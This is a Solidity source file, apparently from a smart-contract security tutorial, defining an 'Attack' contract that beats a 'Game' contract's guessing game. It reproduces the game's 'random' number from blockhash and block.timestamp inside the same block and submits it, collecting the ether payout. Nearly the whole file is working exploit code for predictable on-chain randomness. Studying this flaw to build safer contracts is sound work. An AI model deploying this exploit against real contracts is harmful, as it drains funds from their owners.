// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./Game.sol";

contract Attack {
    Game game;

    // Creates an instance of Game Contract with the help of `gameAddress`
    constructor(address gameAddress) {
        game = Game(gameAddress);
    }

    /**
    attacks the `Game` contract by guessing the exact number because 
    `blockhash` and `blockTimestamp` is public
    */

    function attack() public {
        uint256 _guess = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number), block.timestamp)
            )
        );
        game.guess(_guess);
    }

    // Gets called when the contract recieves ether
    receive() external payable {}
}
